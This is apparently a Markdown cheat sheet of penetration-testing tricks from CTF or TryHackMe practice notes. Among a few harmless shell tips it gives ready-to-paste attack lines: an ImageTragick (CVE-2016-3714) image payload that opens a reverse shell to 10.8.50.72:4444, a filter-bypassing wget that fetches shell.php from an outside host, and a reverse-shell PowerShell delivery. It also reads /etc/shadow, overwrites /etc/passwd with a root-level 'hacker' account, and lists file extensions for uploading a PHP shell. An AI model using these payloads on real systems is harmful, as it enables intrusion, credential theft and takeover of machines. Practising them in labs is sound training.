[back](/README.md)
## Tricks
Here are some handy tricks to enhance your pentesting workflow:

---
#### Spawn a fully interactive shell:
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

#### scan rpc port
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
```

#### CVE-2016–3714

```
cat > image.png << EOF
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
EOF
```


#### Read file:
```python
xxd -r file.txt 
base64 /etc/shadow | base64 -d
ltrace # is a debugging utility in Linux, used to display the calls a userspace application makes to shared libraries.
```
```
`l\s`: Equivalent to `ls`
`wget${IFS}http://10.8.50.72:8000/shell.php`
```

#### if command to long
```python
python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
```

#### Decompress a gzip file:
```sh
gzip -d file.gz
```
#### Change file without vim or nano
```sh
cat > file << EOF 
....
EOF
```

#### php extensions to run revsell
```
.php
.php3
.php4
.php5
.phtml
```

#### broken png image
```
xxd thm.jpg | head
printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
```
#### NFS share
```
mkdir tmp/
sudo mount -t nfs 10.10.104.64: tmp
tree tmp
```

#### socat if open port
```python
./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
```

#### create new user in /etc/passwd with root

```
echo "user:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash" > /etc/passwd
```

fix PATH in old ubuntu
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

#### grep
```
grep -Rwi "text"
```

#### locate
```bash
locate seclist | grep <what>
```
---

#### [steal admin cookie/sqli](/other/src/marketplace.md) (tryhackme:marketplace)
#### [ohmyweb](/other/src/omyweb.md)

---